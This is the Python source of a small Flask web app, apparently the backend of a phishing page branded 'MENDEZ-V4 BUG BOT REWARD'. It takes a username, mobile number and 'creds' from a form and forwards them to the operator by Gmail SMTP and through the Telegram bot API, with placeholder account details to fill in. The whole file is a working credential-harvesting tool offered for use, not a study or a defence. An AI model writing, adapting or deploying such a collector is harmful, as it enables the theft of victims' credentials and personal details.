from flask import Flask, request, render_template
from flask_mail import Mail, Message
import requests

app = Flask(__name__)

# Configure Flask-Mail
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'your_email@gmail.com'  # Your email
app.config['MAIL_PASSWORD'] = 'your_email_password'  # Your email password
mail = Mail(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    mobile = request.form['mobile']
    creds = request.form['creds']

    # Send email
    msg = Message('New Submission from MENDEZ-𝐕4 BUG BOT REWARD',
                  sender='your_email@gmail.com',
                  recipients=['your_email@gmail.com'])
    msg.body = f"Username: {username}\nMobile: {mobile}\nCreds: {creds}"
    
    try:
        mail.send(msg)
        print('Email sent successfully.')
    except Exception as e:
        print('Error sending email:', e)

    # Send to Telegram
    telegram_token = 'YOUR_TELEGRAM_BOT_TOKEN'  # Replace with your bot token
    chat_id = 'YOUR_CHAT_ID'  # Replace with your chat ID
    telegram_message = f"Username: {username}\nMobile: {mobile}\nCreds: {creds}"
    telegram_url = f"https://api.telegram.org/bot{telegram_token}/sendMessage?chat_id={chat_id}&text={telegram_message}"

    try:
        requests.get(telegram_url)
        print('Telegram message sent successfully.')
    except Exception as e:
        print('Error sending Telegram message:', e)

    return 'Data submitted successfully!', 200

if __name__ == '__main__':
    app.run(debug=True)
